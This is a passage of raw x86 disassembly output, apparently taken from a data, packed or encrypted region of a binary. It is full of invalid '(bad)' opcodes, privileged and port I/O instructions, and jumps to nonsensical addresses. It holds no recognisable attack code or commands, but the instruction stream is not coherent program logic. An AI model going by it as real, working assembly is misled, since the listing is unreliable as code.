  42276f:	les    eax,FWORD PTR [ecx]
  422771:	not    esp
  422773:	mov    edi,0xfc1764df
  422778:	xor    al,0x9c
  42277a:	scas   eax,DWORD PTR es:[edi]
  42277b:	enter  0x4d33,0x23
  42277f:	sbb    BYTE PTR [edx],ah
  422781:	pop    ebp
  422782:	push   0x4d3436a7
  422787:	sahf   
  422788:	cmovge esi,DWORD PTR ss:[eax+0x49687626]
  422790:	aas    
  422791:	fist   DWORD PTR [esi-0x7]
  422794:	leave  
  422795:	mov    edi,DWORD PTR [ebx-0x28a6fd68]
  42279b:	add    dl,ch
  42279d:	icebp  
  42279e:	mov    eax,ds:0x4bdd428d
  4227a3:	test   al,0x4e
  4227a5:	push   es
  4227a6:	sar    BYTE PTR [edi],cl
  4227a8:	not    DWORD PTR [eax+0xe]
  4227ab:	or     ebp,DWORD PTR [edx+ecx*2-0x6d94aab4]
  4227b2:	in     eax,dx
  4227b3:	or     eax,0x44456fd2
  4227b8:	xor    esp,DWORD PTR [edi-0x7d8ffdb7]
  4227be:	lock adc esi,edx
  4227c1:	ins    BYTE PTR es:[edi],dx
  4227c2:	push   ebx
  4227c3:	cmp    al,0xa6
  4227c5:	lods   al,BYTE PTR ds:[esi]
  4227c6:	scas   eax,DWORD PTR es:[edi]
  4227c7:	test   eax,0xaa8ab487
  4227cc:	mov    esi,0x40869dfa
  4227d1:	test   DWORD PTR [edx-0x65d86d67],0x73611a88
  4227db:	mov    al,ds:0xf15c97a9
  4227e0:	(bad)  
  4227e1:	jmp    0x8cdef489
  4227e6:	dec    ebx
  4227e7:	cmovp  esp,DWORD PTR ds:0xc3db284
	...
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx-0x384c1df0],ebx
  422808:	popf   
  422809:	(bad)  
  42280a:	enter  0x1a2,0x0
  42280e:	cld    
  42280f:	add    DWORD PTR [eax],eax
  422811:	add    BYTE PTR ds:0x2d3cad00,ah
  422817:	fist   DWORD PTR [ecx-0x251ed9f7]
  42281d:	push   ecx
  42281e:	ficomp WORD PTR [edi]
  422820:	aam    0xe4
  422822:	or     eax,0xe17cddde
  422827:	xchg   edx,eax
  422828:	push   ecx
  422829:	jmp    FWORD PTR [edi]
  42282b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42282c:	and    dh,bh
  42282e:	mov    al,0x4a
  422830:	pop    eax
  422831:	adc    BYTE PTR [ecx+0x3d],dl
  422834:	pop    es
  422835:	(bad)  
  422836:	dec    edi
  422837:	cmc    
  422838:	bound  edi,QWORD PTR [edx-0x111ad36a]
  42283e:	rcl    DWORD PTR [esi+0x418adb38],1
  422844:	mov    ebp,0xa20fbe25
  422849:	ret    0x69d2
  42284c:	bts    DWORD PTR [edi],esp
  42284f:	(bad)  
  422850:	sbb    al,0x28
  422852:	in     eax,0x19
  422854:	xchg   ebx,esp
  422856:	sub    bh,BYTE PTR ds:0x9a8bb4d8
  42285c:	fdivr  DWORD PTR [ebx]
  42285e:	cmp    al,0x5a
  422860:	mov    cl,0x65
  422862:	mov    DWORD PTR [eax-0x42],edi
  422865:	dec    esp
  422866:	fidiv  DWORD PTR [edx+0x71]
  422869:	das    
  42286a:	jle    0x42280b
  42286c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42286d:	scas   eax,DWORD PTR es:[edi]
  42286e:	xor    DWORD PTR [edi],0xd76a71fe
  422874:	call   0x55a5:0x46c3113d
  42287b:	je     0x422897
  42287d:	out    0x81,al
  42287f:	mov    edi,0x920fb288
  422884:	mov    cs,WORD PTR [edi+0x61]
  422887:	mov    cl,0x7a
  422889:	push   ss
  42288a:	fsub   st(7),st
  42288c:	cmp    DWORD PTR [esi],0xffffffb4
  42288f:	push   es
  422890:	cmp    edx,ecx
  422892:	push   cs
  422893:	add    al,0xd5
  422895:	call   0xbaac7a18
  42289a:	jl     0x42287d
  42289c:	jb     0x422837
  42289e:	int    0x70
  4228a0:	push   ds
  4228a1:	cmc    
  4228a2:	fwait
  4228a3:	sub    ebp,ebp
  4228a5:	mov    DWORD PTR [ecx+0x201e818],ecx
  4228ab:	bound  ebx,QWORD PTR [edx]
  4228ad:	xchg   edi,eax
  4228ae:	stos   BYTE PTR es:[edi],al
  4228af:	dec    ebp
  4228b0:	xchg   esp,eax
  4228b1:	add    BYTE PTR [ebx],ah
  4228b3:	dec    eax
  4228b4:	and    ebp,edx
  4228b6:	mov    ds:0xe2c94c18,al
  4228bb:	or     DWORD PTR [edx+0x41c46f89],0xd8b4ed84
  4228c5:	sub    ecx,esi
  4228c7:	hlt    
  4228c8:	bound  edi,QWORD PTR [edi+0x57]
  4228cb:	iret   
  4228cc:	fsub   QWORD PTR [ebp+0x5a]
  4228cf:	or     BYTE PTR [eax-0xba5b74b],dl
  4228d5:	(bad)  
  4228d7:	dec    edx
  4228d8:	dec    esp
  4228d9:	fcmovbe st,st(3)
  4228db:	cmp    esp,DWORD PTR [ebp-0x745b7ab8]
  4228e1:	adc    bl,BYTE PTR [ebp+0x7aaf747c]
  4228e7:	(bad)  
  4228e9:	adc    cl,dl
  4228eb:	leave  
  4228ec:	bound  eax,QWORD PTR ds:0x8073ac53
  4228f2:	outs   dx,BYTE PTR ds:[esi]
  4228f3:	dec    ebp
  4228f4:	inc    edx
  4228f5:	mul    bl
  4228f7:	mov    ch,0xcf
  4228f9:	lock (bad) 
  4228fb:	popa   
  4228fc:	mov    edi,0x16815412
  422901:	jne    0x4228d4
  422903:	xchg   DWORD PTR [ebp+0x5a],esi
  422906:	out    dx,al
  422907:	imul   ebx,edi,0xffffffa8
  42290a:	pop    eax
  42290b:	jbe    0x42291d
  42290d:	ficom  WORD PTR [edi+ecx*1]
  422910:	mov    ds:0xebeb22a5,eax
  422915:	sti    
  422916:	ins    DWORD PTR es:[edi],dx
  422917:	inc    edx
  422918:	ret    
  422919:	in     al,dx
  42291a:	push   cs
  42291b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42291c:	ins    DWORD PTR es:[edi],dx
  42291d:	outs   dx,DWORD PTR ds:[esi]
  42291e:	repnz fild DWORD PTR [esp+esi*4]
  422922:	jl     0x4228d0
  422924:	sbb    al,0x73
  422926:	mov    al,0xb6
  422928:	(bad)  
  422929:	in     eax,0x92
  42292b:	loope  0x42296b
  42292d:	enter  0xfe50,0xfe
  422931:	jae    0x42297e
  422933:	xchg   BYTE PTR [ecx],dl
  422935:	shl    BYTE PTR [esp+ebp*8],1
  422938:	call   0x89b6885a
  42293d:	inc    ecx
  42293e:	cs stos BYTE PTR es:[edi],al
  422940:	data16 jo 0x4229aa
  422943:	scas   al,BYTE PTR es:[edi]
  422944:	mov    esi,0xdceb3cd6
  422949:	clc    
  42294a:	repz rol BYTE PTR [eax],0xde
  42294e:	and    al,0x74
  422950:	pop    ds
  422951:	out    0x20,eax
  422953:	sbb    BYTE PTR [edi-0x4d1baadd],dh
  422959:	adc    ecx,ecx
  42295b:	lahf   
  42295c:	adc    al,0x2a
  42295e:	sub    BYTE PTR [eax+0x50],ch
  422961:	dec    eax
  422962:	or     BYTE PTR [esi],0xa8
  422965:	loopne 0x4229cb
  422967:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  422969:	push   0x94bf5b23
  42296e:	cmp    esi,DWORD PTR [esi]
  422970:	adc    bh,ah
  422972:	mov    cl,0x6d
  422974:	out    0x66,al
  422976:	xchg   esp,eax
  422977:	inc    edi
  422978:	ss mov ecx,0xa42f19c8
  42297e:	loope  0x422905
  422980:	pop    ecx
  422981:	dec    eax
  422982:	add    DWORD PTR [ebp+0x5b],ebp
  422985:	pop    ebp
  422986:	xchg   esp,eax
  422987:	add    al,0x75
  422989:	jmp    0x422946
  42298b:	dec    ebx
  42298c:	push   0xffffff89
  42298e:	and    esi,DWORD PTR [ecx+0x35]
  422991:	shl    BYTE PTR [edx],cl
  422993:	dec    edi
  422994:	inc    esi
  422995:	test   DWORD PTR [eax],edx
  422997:	mov    BYTE PTR [edi+0x3],cl
  42299a:	frstor [ebx+edx*2+0x1a46d12d]
  4229a1:	push   ebx
  4229a2:	js     0x4229ac
  4229a4:	mov    ds:0xee71e3d,eax
  4229a9:	in     eax,dx
  4229aa:	test   BYTE PTR [ebx-0x37],al
  4229ad:	retf   0xe376
  4229b0:	data16 into 
  4229b2:	add    DWORD PTR [edx-0x3d],eax
  4229b5:	jb     0x42295d
  4229b7:	frstor [eax-0x6a5cd1ee]
  4229bd:	scas   al,BYTE PTR es:[edi]
  4229be:	test   eax,0xd75236e4
  4229c3:	mov    esi,0xfd348894
  4229c8:	pop    ss
  4229c9:	inc    edi
  4229ca:	mov    eax,ds:0xe54384bf
  4229cf:	(bad)  
  4229d0:	int    0x5c
  4229d2:	mov    eax,ds:0x309a35fc
  4229d7:	out    dx,eax
  4229d8:	jl     0x422a39
  4229da:	dec    esp
  4229db:	push   ds
  4229dc:	jo     0x4229ce
  4229de:	sti    
  4229df:	xor    BYTE PTR [eax],bh
  4229e1:	sub    al,0x71
  4229e3:	adc    bl,cl
  4229e5:	ss das 
  4229e7:	dec    ecx
  4229e8:	sbb    DWORD PTR [ecx-0x15],edx
  4229eb:	ins    DWORD PTR es:[edi],dx
  4229ec:	jg     0x4229c8
  4229ee:	ja     0x422a2a
  4229f0:	dec    eax
  4229f1:	or     edx,DWORD PTR [ecx]
  4229f3:	ds ret 
  4229f5:	jnp    0x4229fb
  4229f7:	cmp    al,0x78
  4229f9:	jnp    0x422a03
  4229fb:	ror    dl,0xb
  4229fe:	ret    
  4229ff:	enter  0x883a,0xf6
  422a03:	mov    ah,BYTE PTR [ebx+0x3a]
  422a06:	in     al,0x85
  422a08:	ins    BYTE PTR es:[edi],dx
  422a09:	push   ebx
  422a0a:	out    0x88,eax
  422a0c:	(bad)  
  422a0d:	out    0x0,al
	...
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	sub    DWORD PTR gs:0x1a4c435,ecx
  422a2d:	add    ah,bh
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    ch,bl
  422a33:	mov    bl,0x93
  422a35:	scas   al,BYTE PTR es:[edi]
  422a36:	mov    dh,0x57
  422a38:	mov    esp,0x16b0a5c4
  422a3d:	cmp    BYTE PTR [eax+0x19],ah
  422a40:	or     eax,0xf201e694
  422a45:	scas   eax,DWORD PTR es:[edi]
  422a46:	push   0xffffff92
  422a48:	popf   
  422a49:	outs   dx,DWORD PTR ds:[esi]
  422a4a:	stos   DWORD PTR es:[edi],eax
  422a4b:	cli    
  422a4c:	ins    DWORD PTR es:[edi],dx
  422a4d:	and    DWORD PTR [esi],esi
  422a4f:	mov    eax,0x11bb9ebf
  422a54:	loopne 0x422a61
  422a56:	shr    BYTE PTR [esi+0x789d9bce],cl
  422a5c:	lock or esp,ecx
  422a5f:	and    ebx,DWORD PTR [edi-0x4b20eba5]
  422a65:	imul   esp,DWORD PTR [ecx+0x25],0x33baf01f
  422a6c:	jmp    0xaabf78fb
  422a71:	mov    eax,0x19234ca0
  422a76:	mov    WORD PTR [ecx+0x4c31b3a8],gs
  422a7c:	jg     0x422a59
  422a7e:	add    eax,0xb1eadf9
  422a83:	push   ebp
  422a84:	jge    0x422a08
  422a86:	pop    eax
  422a87:	aad    0x97
  422a89:	xchg   esi,eax
  422a8a:	xchg   edx,eax
  422a8b:	cmp    BYTE PTR [ebp-0x20eac007],dh
  422a91:	jbe    0x422a94
  422a93:	mov    ?,WORD PTR [edi]
  422a95:	cdq    
  422a96:	clc    
  422a97:	cs mov esp,0x595d86b9
  422a9d:	dec    esp
  422a9e:	jne    0x422a22
  422aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aa1:	mov    ah,0x66
  422aa3:	pop    ebx
  422aa4:	xchg   DWORD PTR [ecx+0x18],edi
  422aa7:	sbb    ecx,eax
  422aa9:	push   ds
  422aaa:	ins    BYTE PTR es:[edi],dx
  422aab:	cld    
  422aac:	or     BYTE PTR [edx-0x1a54b4cc],bh
  422ab2:	rol    DWORD PTR [ebp+0x2f462975],1
  422ab8:	iret   
  422ab9:	or     al,bh
  422abb:	mov    ds:0xdbdc60b7,al
  422ac0:	cli    
  422ac1:	add    DWORD PTR [ebx+ebp*8-0x344691f0],0x7aba3148
  422acc:	pop    ecx
  422acd:	test   bh,0x9f
  422ad0:	inc    ebp
  422ad1:	pop    esp
  422ad2:	and    al,0xcb
  422ad4:	push   0x71
  422ad6:	jae    0x422b4e
  422ad8:	loope  0x422b11
  422ada:	or     eax,0x32b9c2d
  422adf:	stos   BYTE PTR es:[edi],al
  422ae0:	and    eax,0xeec7aaf0
  422ae5:	aam    0xfe
  422ae7:	or     dx,WORD PTR [ecx-0x2a]
  422aeb:	mov    bh,0x69
  422aed:	jo     0x422b22
  422aef:	sbb    al,BYTE PTR [esi+0x56fa2227]
  422af5:	icebp  
  422af6:	pop    esp
  422af7:	adc    BYTE PTR [edi],cl
  422af9:	(bad)  
  422afa:	ficomp DWORD PTR [esi+edi*2-0x45]
  422afe:	mov    ebp,0x6fc14b0d
  422b03:	sub    eax,0x4880eedb
  422b08:	lock pop ss
  422b0a:	push   esp
  422b0b:	outs   dx,BYTE PTR ds:[esi]
  422b0c:	retf   
  422b0d:	je     0x422b57
  422b0f:	daa    
  422b10:	jns    0x422b56
  422b12:	(bad)  
  422b14:	sbb    al,0xc7
  422b16:	and    bh,BYTE PTR [eax+0x7a5b9048]
  422b1c:	xor    ebx,DWORD PTR [edx+esi*1]
  422b1f:	inc    edx
  422b20:	aaa    
  422b21:	cmp    BYTE PTR [edx-0x5889cdf9],bh
  422b27:	(bad)  
  422b28:	outs   dx,BYTE PTR ds:[esi]
  422b29:	adc    DWORD PTR [ecx+0x21640136],ebx
  422b2f:	add    ebp,DWORD PTR [eax]
  422b31:	cmp    DWORD PTR [ebp-0x10],ebx
  422b34:	cwde   
  422b35:	jmp    0x8a90c918
  422b3a:	imul   esp,ebp,0xffffffc1
  422b3d:	push   ebp
  422b3e:	out    dx,eax
  422b3f:	push   ss
  422b40:	scas   eax,DWORD PTR es:[edi]
  422b41:	(bad)  [esi+0xa33f507]
  422b47:	sbb    BYTE PTR [edx+edi*2-0x1fab1507],bl
  422b4e:	xchg   BYTE PTR ss:[ebx],ah
  422b51:	push   ebx
  422b52:	add    BYTE PTR [ecx-0x5e],dl
  422b55:	aas    
  422b56:	stos   BYTE PTR es:[edi],al
  422b57:	test   DWORD PTR [ecx+0xe97f154],edx
  422b5d:	pop    ecx
  422b5e:	jl     0x422bbf
  422b60:	pop    ebx
  422b61:	mov    ?,WORD PTR [edx-0x4b]
  422b64:	mov    DWORD PTR [edi+edi*2],ebp
  422b67:	dec    ebx
  422b68:	xlat   BYTE PTR ds:[ebx]
  422b69:	xchg   esi,eax
  422b6a:	mov    esp,edi
  422b6c:	popf   
  422b6d:	mov    bh,0x46
  422b6f:	mov    dh,0x5e
  422b71:	jns    0x422ba7
  422b73:	scas   eax,DWORD PTR es:[edi]
  422b74:	shl    BYTE PTR es:[eax],cl
  422b77:	jns    0x422b87
  422b79:	adc    ebp,edi
  422b7b:	jns    0x422b97
  422b7d:	ss pop ebx
  422b7f:	jbe    0x422bfe
  422b81:	cli    
  422b82:	out    0x7d,eax
  422b84:	imul   ecx,DWORD PTR [ebx],0x77
  422b87:	popa   
  422b88:	xchg   edi,eax
  422b89:	(bad)  
  422b8a:	pop    esi
  422b8b:	push   cs
  422b8c:	retf   
  422b8d:	add    BYTE PTR [ebx-0x79],ch
  422b90:	das    
  422b91:	jge    0x422c0b
  422b93:	add    dl,BYTE PTR [edi-0x24]
  422b96:	sub    al,0xf1
  422b98:	sahf   
  422b99:	add    DWORD PTR [ebx-0x756e1328],ebx
  422b9f:	pop    ebx
  422ba0:	stos   DWORD PTR es:[edi],eax
  422ba1:	inc    eax
  422ba2:	dec    esi
  422ba3:	dec    ebx
  422ba4:	mov    ch,0xc7
  422ba6:	sub    BYTE PTR [esi-0x17],bh
  422ba9:	addr16 retf 
  422bab:	fiadd  WORD PTR [edx]
  422bad:	and    ecx,0xe0a69806
  422bb3:	inc    edx
  422bb4:	push   edi
  422bb5:	loop   0x422bbd
  422bb7:	mov    ?,WORD PTR [eax-0x7d021f7c]
  422bbd:	shl    DWORD PTR [edx],cl
  422bbf:	fbstp  TBYTE PTR [edx-0xe69aad1]
  422bc5:	mov    ah,0x91
  422bc7:	cld    
  422bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bc9:	add    DWORD PTR [esi+0x71],ecx
  422bcc:	call   0xd3c6320f
  422bd1:	jbe    0x422b6a
  422bd3:	aas    
  422bd4:	mov    ebx,0xb3e7c8e8
  422bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bda:	mov    ah,0x3b
  422bdc:	pop    ds
  422bdd:	or     al,0xf5
  422bdf:	(bad)  
  422be0:	mov    al,0x1a
  422be2:	out    0x5b,eax
  422be4:	or     DWORD PTR [eax+ecx*1-0x2b181154],ecx
  422beb:	ret    
  422bec:	pop    ebx
  422bed:	enter  0x3c7,0x2c
  422bf1:	adc    ah,0x8a
  422bf4:	jl     0x422b98
  422bf6:	mov    dl,0xc8
  422bf8:	push   ss
  422bf9:	in     eax,dx
  422bfa:	gs outs dx,DWORD PTR fs:[esi]
  422bfd:	(bad)  
  422bfe:	mov    ecx,0x2f8ac68d
  422c03:	add    DWORD PTR [edi],ebp
  422c05:	push   esp
  422c06:	bound  edx,QWORD PTR [edi-0x4dabac62]
  422c0c:	pop    eax
  422c0d:	jge    0x422c7e
  422c0f:	mov    dl,0x56
  422c11:	push   ecx
  422c12:	xchg   edi,eax
  422c13:	mov    es,WORD PTR [eax+0x29]
  422c16:	aas    
  422c17:	and    eax,0x9385b173
  422c1c:	gs cdq 
  422c1e:	imul   ebp,DWORD PTR [esi-0x367077ec],0xf162ad75
  422c28:	dec    eax
  422c29:	dec    esp
  422c2a:	in     eax,0xe
  422c2c:	ret    0x59
	...
  422c37:	add    BYTE PTR [eax],al
  422c39:	add    BYTE PTR ds:0xbf06168e,dh
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    esp,DWORD PTR [edi+0x64]
  422c48:	sahf   
  422c49:	cld    
  422c4a:	shl    BYTE PTR [esi+0x1fc0001],0x0
  422c51:	add    dh,ah
  422c53:	sbb    eax,0xebb271e5
  422c58:	or     ebx,ebp
  422c5a:	lods   eax,DWORD PTR ds:[esi]
  422c5b:	jg     0x422cc0
  422c5d:	dec    edi
  422c5e:	and    eax,0x442fa0c7
  422c63:	ret    
  422c64:	neg    BYTE PTR [ebp+0x33]
  422c67:	mov    esp,0xadbb3b49
  422c6c:	inc    eax
  422c6d:	in     al,0x3b
  422c6f:	lods   eax,DWORD PTR ds:[esi]
  422c70:	ds push eax
  422c72:	shl    DWORD PTR [ebx-0x30efe61a],cl
  422c78:	lods   al,BYTE PTR ds:[esi]
  422c79:	push   ss
  422c7a:	(bad)  
  422c7b:	cmp    BYTE PTR [esi-0x44],bl
  422c7e:	arpl   sp,si
  422c80:	cmp    eax,0xb5260f73
  422c85:	hlt    
  422c86:	sub    DWORD PTR [edx-0x7a5411b1],esi
  422c8c:	sub    DWORD PTR [esi-0x22597fc3],ebx
  422c92:	xchg   esi,eax
  422c93:	and    dh,dh
  422c95:	pop    edi
  422c96:	fsubr  DWORD PTR [si+0x59]
  422c9a:	inc    ecx
  422c9b:	into   
  422c9c:	retf   0xc2b3
  422c9f:	inc    eax
  422ca0:	xchg   BYTE PTR [ebx],bh
  422ca2:	in     al,0x34
  422ca4:	stc    
  422ca5:	mov    al,ds:0xb662c580
  422caa:	sub    ah,BYTE PTR [esi+esi*8]
  422cad:	jo     0x422d06
  422caf:	scas   al,BYTE PTR es:[edi]
  422cb0:	pop    ds
  422cb1:	out    dx,al
  422cb2:	mov    ?,WORD PTR ds:0x6d29474c
  422cb8:	cld    
  422cb9:	jmp    0xf8e9:0xbd24ec90
  422cc0:	add    eax,0xd8d2ef5f
  422cc5:	scas   al,BYTE PTR es:[edi]
  422cc6:	pop    esp
  422cc7:	push   esp
  422cc8:	push   0xd484ce11
  422ccd:	sub    eax,0x6f40780b
  422cd2:	jle    0x422cd4
  422cd4:	pop    ebp
  422cd5:	les    edi,FWORD PTR ds:[esi-0x5a7bf7cc]
  422cdc:	(bad)  
  422cdd:	push   ss
  422cde:	stc    
  422cdf:	push   0x4c
  422ce1:	ficom  WORD PTR [ebp-0x46cffc70]
  422ce7:	pushf  
  422ce8:	nop
  422ce9:	and    edi,DWORD PTR [ecx]
  422ceb:	pop    edi
  422cec:	jl     0x422d4a
  422cee:	enter  0xcb3f,0x84
  422cf2:	pop    esp
  422cf3:	mov    ah,0x42
  422cf5:	jle    0x422c90
  422cf7:	or     ebx,DWORD PTR [eax+0x6cf3ada3]
  422cfd:	cmp    ecx,DWORD PTR [ecx+eax*2]
  422d00:	mov    edx,0x4b7679fa
  422d05:	cmp    eax,0x4e4851e2
  422d0a:	(bad)  
  422d0b:	sub    eax,0x53d592e1
  422d10:	fwait
  422d11:	pop    ebp
  422d12:	(bad)  
  422d13:	sub    eax,0x49914270
  422d18:	cdq    
  422d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d1a:	aaa    
  422d1b:	aas    
  422d1c:	cs js  0x422cf7
  422d1f:	test   eax,0x1b3a6128
  422d24:	std    
  422d25:	stos   DWORD PTR es:[edi],eax
  422d26:	rcl    BYTE PTR [edx+0x7ce95901],cl
  422d2c:	mov    esi,0x367d5c2e
  422d31:	inc    ebp
  422d32:	mov    BYTE PTR [ecx-0x62],dh
  422d35:	pop    ebx
  422d36:	outs   dx,DWORD PTR ds:[esi]
  422d37:	ror    DWORD PTR [eax+0x6b2c7dd3],cl
  422d3d:	sar    BYTE PTR [edi],0xea
  422d40:	mov    WORD PTR [ecx+0x2f],ds
  422d43:	addr16 test al,0xdc
  422d46:	ror    DWORD PTR [ebx+0xa821671],0x93
  422d4d:	in     al,dx
  422d4e:	sbb    DWORD PTR [ebx+0x30],ecx
  422d51:	fst    DWORD PTR [esi]
  422d53:	call   0xac11:0xe15729d6
  422d5a:	cwde   
  422d5b:	fist   DWORD PTR [edi+0x33]
  422d5e:	dec    eax
  422d5f:	mov    al,ds:0xb3d9a81b
  422d64:	mov    edx,0x2a0a9a61
  422d69:	repz sahf 
  422d6b:	jae    0x422d0f
  422d6d:	xchg   DWORD PTR [edi+esi*2+0x781f108d],ebp
  422d74:	adc    cl,dl
  422d76:	(bad)  
  422d77:	cmp    bl,BYTE PTR [edx-0xa]
  422d7a:	leave  
  422d7b:	dec    edx
  422d7c:	mov    edi,0xacb7c760
  422d81:	cmp    dh,BYTE PTR [edi+0x467fb9ce]
  422d87:	or     dh,BYTE PTR [edx-0x61]
  422d8a:	jge    0x422dc6
  422d8c:	aam    0x39
  422d8e:	sbb    bh,bl
  422d90:	gs mov bh,0x2b
  422d93:	mov    edi,0xc2b7c201
  422d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d9a:	push   ecx
  422d9b:	stos   DWORD PTR es:[edi],eax
  422d9c:	mov    edi,0xd0d4f31d
  422da1:	(bad)  
  422da2:	aam    0x51
  422da4:	ror    DWORD PTR [esi+ebp*2+0x27a19271],cl
  422dab:	cwde   
  422dac:	imul   edi,edx,0xffffffef
  422daf:	adc    al,0x55
  422db1:	mov    esp,0x490e41cb
  422db6:	pop    ss
  422db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422db8:	jmp    0x422ddc
  422dba:	push   0x4b
  422dbc:	mov    ds:0xaa10d444,eax
  422dc1:	out    dx,al
  422dc2:	das    
  422dc3:	or     edi,esp
  422dc5:	dec    eax
  422dc6:	lods   eax,DWORD PTR ds:[esi]
  422dc7:	adc    dl,BYTE PTR [edi-0x160e66ce]
  422dcd:	jae    0x422da6
  422dcf:	(bad)  
  422dd0:	jecxz  0x422dfa
  422dd2:	pusha  
  422dd3:	imul   esi,DWORD PTR [eax+0x21],0x6bfa211f
  422dda:	cmp    cl,BYTE PTR [edx+0x34350048]
  422de0:	inc    ecx
  422de1:	aas    
  422de2:	mov    esp,0x42fd0d94
  422de7:	or     cl,cl
  422de9:	int3   
  422dea:	mov    al,ds:0x583217fe
  422def:	push   0x9b1941d1
  422df4:	data16 cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  422df7:	je     0x422dde
  422df9:	xchg   esp,eax
  422dfa:	(bad)  [ebx+0x6]
  422dfd:	imul   ebp,esp,0xfffffff8
  422e00:	dec    edx
  422e01:	pop    eax
  422e02:	pop    ds
  422e03:	inc    edi
  422e04:	add    ah,BYTE PTR [eax]
  422e06:	add    DWORD PTR [eax+eax*4],ecx
  422e09:	xchg   ebp,eax
  422e0a:	xchg   esp,eax
  422e0b:	xchg   ebp,eax
  422e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e0e:	add    ebp,0xffffffc7
  422e11:	loope  0x422d95
  422e13:	fisttp DWORD PTR ds:[ebp-0x4adab3fa]
  422e1a:	in     al,0x1d
  422e1c:	fnstcw WORD PTR [esi]
  422e1e:	inc    edi
  422e1f:	or     DWORD PTR [ebx-0x2dd867e8],0x756fe15d
  422e29:	mov    dl,ch
  422e2b:	jbe    0x422dae
  422e2d:	lods   al,BYTE PTR ds:[esi]
  422e2e:	sar    BYTE PTR gs:[edx+0x7d20c8d6],cl
  422e35:	xchg   ecx,eax
  422e36:	test   esp,edx
  422e38:	nop
  422e39:	daa    
  422e3a:	mov    ebx,esp
  422e3c:	and    DWORD PTR [esi+ecx*4],ebx
  422e3f:	add    eax,0xddda99c2
  422e44:	fdiv   st(0),st
  422e46:	(bad)  
  422e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e48:	sub    al,0x50
  422e4a:	dec    edi
  422e4b:	inc    edx
  422e4c:	fidivr DWORD PTR [eax+eax*1]
	...
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi+0x13e9fec4]
  422e68:	mov    esi,DWORD PTR [eax]
  422e6a:	mov    esp,0xfc0001a8
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [edi*2-0xd4d9fd4],ch
  422e78:	out    dx,eax
  422e79:	fs pop eax
  422e7b:	(bad)  
  422e7d:	xchg   edi,eax
  422e7e:	xchg   edi,eax
  422e7f:	pop    ebp
  422e80:	fadd   st(7),st
  422e82:	mov    al,ds:0xb2a98e79
  422e87:	ins    BYTE PTR es:[edi],dx
  422e88:	sbb    bh,BYTE PTR [ebp+0x6534a12a]
  422e8e:	jmp    0x7d31c420
  422e93:	btr    ebx,edi
  422e96:	ficom  DWORD PTR [ebx-0x423f8bce]
  422e9c:	aam    0xb1
  422e9e:	xchg   esp,eax
  422e9f:	push   0x6c777989
  422ea4:	jle    0x422f01
  422ea6:	pop    ss
  422ea7:	rol    ecx,cl
  422ea9:	mov    eax,0xb527ff1a
  422eae:	mov    es:0x40b314b2,eax
  422eb4:	fistp  QWORD PTR [ecx-0x30]
  422eb7:	cmp    al,0x2f
  422eb9:	sar    DWORD PTR ds:0xeb5ef7ea,cl
  422ebf:	mov    bl,0x94
  422ec1:	sysexit 
  422ec3:	mov    ah,0x8f
  422ec5:	fwait
  422ec6:	push   cs
  422ec7:	test   bh,al
  422ec9:	not    BYTE PTR [edx]
  422ecb:	popf   
  422ecc:	data16 mov ah,dl
  422ecf:	mov    eax,0x309ca897
  422ed4:	push   eax
  422ed5:	sub    dh,BYTE PTR [ebx]
  422ed7:	rol    DWORD PTR [edx-0x697bf8d],0xdf
  422ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422edf:	jo     0x422ec2
  422ee1:	jle    0x422ef7
  422ee3:	ss sti 
  422ee5:	imul   ecx,DWORD PTR [eax-0x42],0x47547f8a
  422eec:	shl    DWORD PTR gs:[ebx+eiz*8-0x6d],0x13
  422ef2:	mov    al,ds:0xba25ec71
  422ef7:	mov    dl,0x63
  422ef9:	add    DWORD PTR [ebx],edi
  422efb:	ret    
  422efc:	pop    ebp
  422efd:	inc    esp
  422efe:	fs and ebx,eax
  422f01:	iret   
  422f02:	push   ss
  422f03:	mov    ebx,0xceade263
  422f08:	mov    ebx,0x37aa225b
  422f0d:	cs xor eax,0x5d6e4b65
  422f13:	xor    BYTE PTR [ecx-0x1289354c],0x4
  422f1a:	retf   
  422f1b:	ja     0x422ec1
  422f1d:	add    edi,ebx
  422f1f:	push   eax
  422f20:	in     eax,dx
  422f21:	fiadd  DWORD PTR [eax+0x40]
  422f24:	neg    DWORD PTR [ebx+0x5]
  422f27:	lea    eax,[esi]
  422f29:	adc    DWORD PTR [ebx+edx*1+0x7bdd9d7d],esi
  422f30:	and    eax,0x2e32758f
  422f35:	loop   0x422efb
  422f37:	mov    dl,0xfa
  422f39:	int    0x5c
  422f3b:	ss adc eax,0x54e3c56d
  422f41:	xor    DWORD PTR [ebp+0x57],ebx
  422f44:	mov    ch,0x1b
  422f46:	cdq    
  422f47:	cld    
  422f48:	fld    TBYTE PTR [ecx]
